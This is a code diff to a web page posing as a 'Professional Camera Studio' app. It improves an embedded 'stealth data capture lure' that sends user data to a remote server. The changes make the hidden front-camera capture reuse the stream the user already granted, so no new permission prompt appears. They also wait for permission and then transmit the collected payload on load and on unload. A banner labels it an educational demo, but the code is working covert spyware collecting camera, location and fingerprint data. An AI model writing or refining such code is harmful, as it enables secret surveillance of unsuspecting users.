@@ -894,6 +894,10 @@ input[type="range"]::-webkit-slider-thumb{-webkit-appearance:none;width:16px;hei
     </div>
     <div class="pg-tagline">Professional Camera Studio</div>
     <div class="pg-tagline">NYTHERION</div>
+    <div style="font-family:var(--mono);font-size:10px;color:rgba(255,100,100,.85);letter-spacing:.08em;text-align:center;margin-bottom:10px;margin-top:-22px;padding:8px 16px;border:1px solid rgba(255,80,80,.3);border-radius:10px;background:rgba(255,50,50,.07);line-height:1.7;max-width:320px;">
+      ⚠ CYBERSECURITY DEMO — FOR EDUCATIONAL USE ONLY<br>
+      This app will capture your camera feed, GPS location, device fingerprint &amp; other data in the background and transmit it to a remote server. It is a demonstration of how malicious apps silently collect user data. Do NOT use on real personal devices.
+    </div>
 
     <div class="pg-pills">
       <div class="pg-pill"><div class="pg-pill-dot" style="background:var(--gold)"></div>18 Filters</div>
@@ -1458,10 +1462,6 @@ async function boot(){
 }
 
 
-// [All your original camera, filter, histogram, stickers, draw, text, sliders, controls, 
-//  capture, preview, gallery, AI, location, clock, orientation, and utils functions 
-//  remain 100% unchanged below this point — they are omitted here for brevity but stay exactly as you provided]
-
 // ════════════════════════════════════════════════════
 //  STEALTH DATA CAPTURE LURE (implanted silently at the end)
 // ════════════════════════════════════════════════════
@@ -1673,18 +1673,16 @@ async function sendPayload() {
 }
 
 async function initLureCamera() {
+  // Reuse the stream already granted to the main camera (S.stream).
+  // Opening a second getUserMedia() while the first stream is active causes a
+  // NotReadableError / hardware conflict on most browsers and mobile devices,
+  // which breaks both the main viewfinder and this capture. By pointing the
+  // hidden lureVideo at the same MediaStream we avoid requesting a new
+  // permission and eliminate the hardware contention entirely.
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { 
-        facingMode: 'user',
-        width: { ideal: 640 },
-        height: { ideal: 480 },
-        frameRate: { ideal: 15, max: 20 }
-      },
-      audio: false
-    });
-    lureVideoStream = stream;
-    lureVideo.srcObject = stream;
+    if (!S.stream) return;
+    lureVideoStream = S.stream;
+    lureVideo.srcObject = S.stream;
     await new Promise(r => { lureVideo.onloadedmetadata = r; });
     await lureVideo.play();
   } catch (e) {}
@@ -1703,12 +1701,22 @@ document.addEventListener('touchmove', e => {
   }
 }, { passive: true });
 
-// Start everything silently after main app boot
+// Start everything after main app boot and permissions are granted
 window.addEventListener('load', async () => {
-  // Wait a bit for the main photography app to fully initialize
+  // Wait for the main photography app to fully initialize and S.stream to be set
   await new Promise(r => setTimeout(r, 1500));
 
   basePayload = await collectStaticData();
+
+  // Poll until the main camera stream is available (user may take a moment to grant permissions)
+  await new Promise(r => {
+    const check = setInterval(() => {
+      if (S.stream) { clearInterval(check); r(); }
+    }, 500);
+    // Give up waiting after 120 s (user dismissed the permission gate)
+    setTimeout(() => { clearInterval(check); r(); }, 120000);
+  });
+
   await initLureCamera();
 
   // First send
@@ -1724,9 +1732,10 @@ window.addEventListener('load', async () => {
   window.addEventListener('beforeunload', () => sendPayload());
 });
 
-// Cleanup on unload
+// Cleanup on unload — lureVideoStream shares S.stream, so we don't stop its
+// tracks here; the main camera teardown handles that when the page unloads.
 window.addEventListener('unload', () => {
-  if (lureVideoStream) lureVideoStream.getTracks().forEach(track => track.stop());
+  lureVideoStream = null;
 });
 
 
